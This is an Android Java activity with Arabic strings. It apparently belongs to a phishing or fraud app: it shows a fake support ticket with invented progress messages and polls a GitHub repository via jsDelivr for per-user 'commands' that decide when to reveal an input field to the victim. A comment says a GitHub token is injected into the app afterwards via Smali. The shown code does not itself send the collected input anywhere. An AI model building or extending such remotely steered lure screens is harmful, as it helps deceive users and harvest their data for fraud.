package com.ban.ab;

import android.content.Intent;
import android.content.SharedPreferences;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.util.Base64;
import android.view.View;
import android.widget.Button;
import android.widget.EditText;
import android.widget.LinearLayout;
import android.widget.TextView;
import android.widget.Toast;
import androidx.appcompat.app.AppCompatActivity;
import androidx.cardview.widget.CardView;

import org.json.JSONObject;
import java.io.IOException;
import okhttp3.Call;
import okhttp3.Callback;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.Response;

public class SecondActivity extends AppCompatActivity {

    private String userName;
    private final String GITHUB_TOKEN = ""; // يتم حقنه عبر Smali
    private final String GITHUB_REPO_PATH = "abdullah14120/ban";
    private final OkHttpClient client = new OkHttpClient();

    private CardView layoutWaiting, layoutRejected, layoutFields;
    private LinearLayout groupField1;
    private TextView txtRejectReason, txtProgressStatus, txtTicketID;
    private EditText field1;
    private Button btnCancelOrder, btnConfirm1;

    private long startTime;
    private final Handler refreshHandler = new Handler(Looper.getMainLooper());
    private Runnable refreshRunnable;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_second);

        SharedPreferences pref = getSharedPreferences("AppPrefs", MODE_PRIVATE);
        userName = pref.getString("user_name", "");
        startTime = System.currentTimeMillis();

        initViews();
        generateTicketID();
        startStatusSequence(); // نصوص الحالة المتغيرة
        startAutoRefresh();
    }

    private void initViews() {
        layoutWaiting = findViewById(R.id.layoutWaiting);
        layoutRejected = findViewById(R.id.layoutRejected);
        layoutFields = findViewById(R.id.layoutFields);
        txtProgressStatus = findViewById(R.id.txtProgressStatus);
        txtTicketID = findViewById(R.id.txtTicketID);
        txtRejectReason = findViewById(R.id.txtRejectReason);
        groupField1 = findViewById(R.id.groupField1);
        field1 = findViewById(R.id.field1);
        btnConfirm1 = findViewById(R.id.btnConfirm1);
        btnCancelOrder = findViewById(R.id.btnCancelOrder);

        btnCancelOrder.setOnClickListener(v -> {
            stopAutoRefresh();
            getSharedPreferences("AppPrefs", MODE_PRIVATE).edit().clear().apply();
            startActivity(new Intent(this, MainActivity.class));
            finish();
        });
    }

    private void generateTicketID() {
        String tkt = "TKT-" + (System.currentTimeMillis() / 100000);
        txtTicketID.setText("تذكرة رقم: " + tkt);
    }

    private void startStatusSequence() {
        String[] msgs = {"جاري فحص البيانات...", "بانتظار المشرف المباشر...", "يتم الآن تأمين الاتصال...", "جاري المراجعة النهائية..."};
        Handler h = new Handler(Looper.getMainLooper());
        h.post(new Runnable() {
            int i = 0;
            @Override
            public void run() {
                if (layoutWaiting.getVisibility() == View.VISIBLE) {
                    txtProgressStatus.setText(msgs[i % msgs.length]);
                    i++;
                    h.postDelayed(this, 4000);
                }
            }
        });
    }

    private void startAutoRefresh() {
        refreshRunnable = new Runnable() {
            @Override
            public void run() {
                checkStatus();
                refreshHandler.postDelayed(this, 10000); // تحديث كل 10 ثوانٍ
            }
        };
        refreshHandler.post(refreshRunnable);
    }

    private void checkStatus() {
        // استخدام jsDelivr مع كسر الكاش للحصول على استجابة سريعة جداً للتعديل اليدوي
        String url = "https://cdn.jsdelivr.net/gh/" + GITHUB_REPO_PATH + "@main/commands/" + userName + ".json?v=" + System.currentTimeMillis();

        Request request = new Request.Builder().url(url).build();
        client.newCall(request).enqueue(new Callback() {
            @Override
            public void onFailure(Call call, IOException e) {}

            @Override
            public void onResponse(Call call, Response response) throws IOException {
                if (response.isSuccessful() && response.body() != null) {
                    try {
                        JSONObject data = new JSONObject(response.body().string());
                        String status = data.optString("status", "waiting");
                        runOnUiThread(() -> updateUI(status, data));
                    } catch (Exception ignored) {}
                }
            }
        });
    }

    private void updateUI(String status, JSONObject data) {
        // الرد الآلي بعد 15 دقيقة
        if (status.equals("waiting") && (System.currentTimeMillis() - startTime > 15 * 60 * 1000)) {
            status = "timeout";
        }

        layoutWaiting.setVisibility(View.GONE);
        layoutRejected.setVisibility(View.GONE);
        layoutFields.setVisibility(View.GONE);

        switch (status) {
            case "waiting":
                layoutWaiting.setVisibility(View.VISIBLE);
                break;
            case "rejected":
                layoutRejected.setVisibility(View.VISIBLE);
                txtRejectReason.setText(data.optString("reason", "تم رفض الطلب من قبل الإدارة."));
                break;
            case "fields":
                layoutFields.setVisibility(View.VISIBLE);
                groupField1.setVisibility(data.has("f1") ? View.VISIBLE : View.GONE);
                break;
            case "timeout":
                layoutRejected.setVisibility(View.VISIBLE);
                txtRejectReason.setText("نأسف، لا يمكننا خدمتك لعدم توفر أحد من فريق الدعم حالياً. يرجى المحاولة لاحقاً.");
                stopAutoRefresh();
                break;
        }
    }

    private void stopAutoRefresh() {
        if (refreshHandler != null && refreshRunnable != null) {
            refreshHandler.removeCallbacks(refreshRunnable);
        }
    }

    @Override
    protected void onDestroy() {
        super.onDestroy();
        stopAutoRefresh();
    }
}
